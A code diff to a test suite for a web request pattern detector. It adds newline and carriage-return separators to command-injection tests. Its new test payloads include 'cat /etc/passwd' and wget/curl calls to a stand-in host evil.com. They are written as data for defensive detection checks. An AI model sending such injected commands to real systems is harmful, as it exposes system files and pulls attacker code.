@@ -89,15 +89,15 @@ describe('Suspicious Pattern Detection Improvements', () => {
     it('should detect reconnaissance commands with separators', () => {
       const commands = ['whoami', 'id', 'hostname', 'uname'];
       for (const cmd of commands) {
-        // Test with different separators
+        // Test with different separators including carriage returns and line feeds
         // Note: & is excluded from unencoded URL testing because URL search params
         // would split it into multiple parameters.
-        const separators = [';', '|', '`'];
+        const separators = [';', '|', '`', '\n', '\r\n'];
         for (const sep of separators) {
           const payload =
-            sep === '`' ? `test${sep}${cmd}${sep}` : `test ${sep} ${cmd}`;
+            sep === '`' ? `test${sep}${cmd}${sep}` : `test${sep}${cmd}`;
           const request = createMockRequest(
-            `https://example.com/api/test?cmd=${payload}`
+            `https://example.com/api/test?cmd=${encodeURIComponent(payload)}`
           );
           const result = detectSuspiciousPatterns(request, { minSeverity: 3 });
           expect(result.detected).toBe(true);
@@ -106,6 +106,25 @@ describe('Suspicious Pattern Detection Improvements', () => {
             result.patterns.some((p) => p.category === 'command_injection')
           ).toBe(true);
         }
+      }
+    });
+
+    it('should detect file reading and download commands with newline separators', () => {
+      const payloads = [
+        '\ncat /etc/passwd',
+        '\r\ncat /etc/passwd',
+        '\nwget http://evil.com/malware',
+        '\r\ncurl http://evil.com/shell',
+      ];
+      for (const payload of payloads) {
+        const request = createMockRequest(
+          `https://example.com/api/test?arg=${encodeURIComponent(payload)}`
+        );
+        const result = detectSuspiciousPatterns(request, { minSeverity: 2 });
+        expect(result.detected).toBe(true);
+        expect(
+          result.patterns.some((p) => p.category === 'command_injection')
+        ).toBe(true);
       }
     });
 
